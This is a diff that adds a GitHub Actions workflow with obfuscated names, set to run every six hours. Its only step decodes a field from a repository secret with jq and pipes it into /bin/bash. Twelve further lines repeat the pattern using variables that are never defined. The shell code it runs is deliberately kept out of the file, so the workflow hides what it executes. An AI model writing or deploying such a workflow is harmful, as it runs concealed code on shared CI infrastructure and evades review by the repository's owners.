@@ -1,0 +1,28 @@
+name: chickdecent
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chickdecent
+        env:
+          d590: ${{ secrets.d590 }}
+        run: |
+          echo $d590 | jq -r .mqjex38 | /bin/bash
+          echo $gxu23 | jq -r .yymab4 | /bin/bash
+          echo $ee95 | jq -r .dbpl63129 | /bin/bash
+          echo $tfts89364 | jq -r .sk89 | /bin/bash
+          echo $ef2247 | jq -r .fqlws87 | /bin/bash
+          echo $hzzdy3106 | jq -r .gt5 | /bin/bash
+          echo $nvp6 | jq -r .n8560 | /bin/bash
+          echo $yngrf84 | jq -r .g87 | /bin/bash
+          echo $dlo74375 | jq -r .s8 | /bin/bash
+          echo $ggev82302 | jq -r .oz995 | /bin/bash
+          echo $jxpy20954 | jq -r .qroh88089 | /bin/bash
+          echo $vc78 | jq -r .lc481 | /bin/bash
+          echo $l94 | jq -r .rjf3196 | /bin/bash
+
